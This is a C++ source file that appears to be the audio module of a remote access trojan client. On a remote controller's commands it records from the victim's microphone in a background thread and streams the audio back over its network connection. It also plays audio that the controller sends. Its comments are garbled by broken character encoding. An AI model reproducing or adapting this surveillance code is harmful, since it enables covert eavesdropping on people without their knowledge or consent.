#include "AudioManager.h"



CAudioManager::CAudioManager(_CIOCPClient * IOCPClient) : CManager(IOCPClient)
{
	printf("CAudioManager()�������\r\n");
	m_bIsWorking = FALSE;
	m_AudioObject = NULL;
	m_WorkThreadHandle = NULL;
	if (Initialize() == FALSE)
	{
		return;
	}
	BYTE IsToken = CLIENT_AUDIO_MANAGER_REPLY;
	m_IOCPClient->OnSending((char*)&IsToken,1);
	
	WaittingForDialogOpen(); //�ȴ��Ի����

	m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadProdurce,
		(LPVOID)this, 0, NULL);
}


CAudioManager::~CAudioManager()
{
	m_bIsWorking = FALSE;

	WaitForSingleObject(m_WorkThreadHandle, INFINITE);

	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}

	if (m_AudioObject!=NULL)
	{
		delete m_AudioObject;
		m_AudioObject = NULL;
	}
	printf("~CAudioManager()��������\r\n");
}

BOOL CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())
	{
		return FALSE;
	}
	if (m_bIsWorking == TRUE)
	{
		return FALSE;
	}

	m_AudioObject = new CAudio;//���������������ڴ�
	m_bIsWorking = TRUE;
	return TRUE;

}

VOID CAudioManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
	}
	case CLIENT_AUDIO_MANAGER_RECORD_DATA:
	{
		m_bIsWorking = FALSE;
		if (m_WorkThreadHandle != NULL)
		{
			CloseHandle(m_WorkThreadHandle);
			m_WorkThreadHandle = NULL;
		}
		m_AudioObject->ChangeStatus();
		m_AudioObject->PlayRecordData(BufferData + 1, BufferLength - 1);
		break;
	}
	case CLENT_AUDIO_MANAGER_PLAY:
	{
		m_AudioObject->ChangeStatus();
		m_bIsWorking = TRUE;
		m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadProdurce, this, 0, NULL);	//���������߳�
		break;
	}
	}
}

DWORD CAudioManager::WorkThreadProdurce(LPVOID lParam)
{
	CAudioManager *This = (CAudioManager*)lParam;
	while (This->m_bIsWorking)
	{
		This->SendRecordBuffer();
	}
	printf("CAudioManager::WorkThreadProdurce�˳��߳�/r/n");
	return 0;
}

int CAudioManager::SendRecordBuffer()
{
	DWORD BufferLength = 0;
	DWORD ReturnLength = 0;
	//����õ���Ƶ����
	LPBYTE AudioData = m_AudioObject->GetRecordData(&BufferLength);
	if (AudioData ==NULL)
	{
		return 0;
	}
	//���仺����
	LPBYTE BufferData = new BYTE[BufferLength + 1];
	//��������ͷ
	BufferData[0] = CLIENT_AUDIO_MANAGER_RECORD_DATA;
	//���ƻ�����
	memcpy(BufferData + 1, AudioData, BufferLength);
	//���ͳ�ȥ
	if (BufferLength)
	{
		ReturnLength = m_IOCPClient->OnSending((char*)BufferData,BufferLength+1);
	}
	if (BufferData != NULL)
	{
		delete BufferData;
		BufferData = NULL;
	}
	return ReturnLength;
}